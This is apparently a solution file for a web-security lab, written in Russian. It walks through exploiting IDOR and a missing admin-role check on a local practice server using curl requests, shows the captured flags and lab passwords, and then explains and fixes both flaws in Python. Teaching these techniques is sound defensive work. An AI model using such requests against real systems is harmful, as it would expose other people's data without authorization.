🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)

# A01 — Решение (спойлеры!)

Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.md).

## Эксплуатация на vulnerable (порт 8001)

```bash
# 1. Вход как alice, cookie сохраняется в jar.txt
curl -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' http://127.0.0.1:8001/login

# 2. Свои заметки: id = 1
curl -b jar.txt http://127.0.0.1:8001/api/notes

# 3. IDOR: подставляем чужой id (заметка админа = 3)
curl -b jar.txt http://127.0.0.1:8001/api/notes/3
# → флаг FLAG{a01_idor_admin_note}

# 4. Доступ к функции администратора без роли admin
curl -b jar.txt http://127.0.0.1:8001/admin/users
# → список пользователей и флаг FLAG{a01_admin_panel_open}
```

## В чём ошибка

1. `GET /api/notes/<id>`: сервер проверяет только то, что пользователь вошёл, но не сверяет `note["owner"]` с текущим пользователем (**IDOR**).
2. `GET /admin/users`: сервер не проверяет роль, достаточно любой сессии (**отсутствие проверки прав на функцию**).

## Исправление

```python
# Владелец ресурса
if note["owner"] != current_user():
    return jsonify(error="forbidden"), 403

# Роль администратора
def admin_required(view):
    @wraps(view)
    @login_required
    def wrapper(*args, **kwargs):
        if USERS[current_user()]["role"] != "admin":
            return jsonify(error="forbidden"), 403
        return view(*args, **kwargs)
    return wrapper
```

Те же запросы на fixed (порт 8002) вернут `403 forbidden`. Админ (`admin` / `Adm1n-lab-pass`) по-прежнему имеет доступ к своим заметкам и к `/admin/users`.

## Что ещё стоит помнить
- Скрытый или «непредсказуемый» URL не заменяет проверку прав.
- Случайные идентификаторы (UUID) усложняют перебор, но не отменяют проверку владельца.
- Проверяйте права и для операций записи и удаления, не только для чтения.
